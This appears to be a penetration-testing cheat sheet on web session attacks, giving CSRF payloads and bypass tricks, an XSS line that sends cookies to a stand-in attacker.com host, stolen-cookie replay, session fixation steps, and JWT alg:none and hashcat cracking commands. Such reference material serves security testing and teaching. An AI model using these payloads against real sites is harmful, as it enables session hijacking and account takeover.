# Session Security

Session management vulnerabilities allow attackers to steal, forge, or hijack user sessions — leading to account takeover.

## CSRF (Cross-Site Request Forgery)

Tricks authenticated users into submitting malicious requests to a target site.

```html
<!-- Victim visits attacker page, triggers request to bank -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">

<!-- Form-based CSRF -->
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Bypass CSRF protections:**
```
- Remove CSRF token entirely → may still work
- Use another user's valid CSRF token (if not tied to session)
- Change request method: POST → GET
- Change Content-Type: application/json → text/plain
```

## Session Hijacking

```bash
# Steal session cookie via XSS
<script>document.location='http://attacker.com/?c='+document.cookie</script>

# Set stolen cookie in browser
document.cookie = "PHPSESSID=stolen_value; path=/"

# Or use curl
curl -b "PHPSESSID=stolen_value" http://target.com/profile
```

## Cookie Attributes

| Flag | Bypass Risk |
|------|-------------|
| No `HttpOnly` | Cookie readable via `document.cookie` (XSS can steal it) |
| No `Secure` | Cookie transmitted over HTTP (MitM can steal it) |
| No `SameSite` | Cookie sent cross-site (CSRF works) |
| `SameSite=Lax` | Only blocks cross-site POST CSRF |
| `SameSite=Strict` | Full protection against CSRF |

## Session Fixation

```
1. Attacker obtains a valid session ID (e.g., unauthenticated)
2. Tricks victim into using that session ID
3. Victim authenticates — if server doesn't regenerate session, attacker owns it

Detection: is session ID the same before and after login?
```

## JWT Attacks

```bash
# Decode
python3 -c "import base64; print(base64.b64decode('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' + '==').decode())"

# Test alg:none
header = {"alg":"none","typ":"JWT"}
# Create token with empty signature: header.payload.

# Test weak secret brute force
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```
